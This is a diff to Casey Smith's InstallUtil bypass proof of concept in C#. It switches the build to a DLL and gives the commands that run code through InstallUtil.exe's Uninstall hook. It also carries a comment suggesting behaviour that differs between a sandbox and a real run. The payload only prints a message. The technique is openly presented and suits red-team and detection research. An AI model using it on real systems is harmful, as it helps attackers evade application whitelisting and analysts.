@@ -10,10 +10,10 @@ Author: Casey Smith, Twitter: @subTee
 License: BSD 3-Clause
 
 Step One:
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:InstallUtilBypass.exe InstallUtilBypass.cs
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:InstallUtilBypass.exe /target:library InstallUtilBypass.cs
 
 Step Two:
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /U /logfile= /logtoconsole=false InstallUtilBypass.exe
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /U /logfile= /logtoconsole=false InstallUtilBypass.dll
 
 
 */
@@ -24,11 +24,11 @@ public class Program
 	{
 		Console.WriteLine("Hey There From Main()");
 		//Add any behaviour here to throw off sandbox execution/analysts :)
-    		//These binaries can exhibit one behavior when executed in sandbox, and entirely different one when invoked 
+    		//These binaries can exhibit one behavior when executed in sandbox, and entirely different one when invoked
     		//by InstallUtil.exe
-		
+
 	}
-	
+
 }
 
 [System.ComponentModel.RunInstaller(true)]
@@ -37,9 +37,9 @@ public class Sample : System.Configuration.Install.Installer
 	//The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
 	public override void Uninstall(System.Collections.IDictionary savedState)
 	{
-	
+
 		Console.WriteLine("Hello There From Uninstall, If you are reading this, prevention has failed.");
-		
+
 	}
-	
+
 }
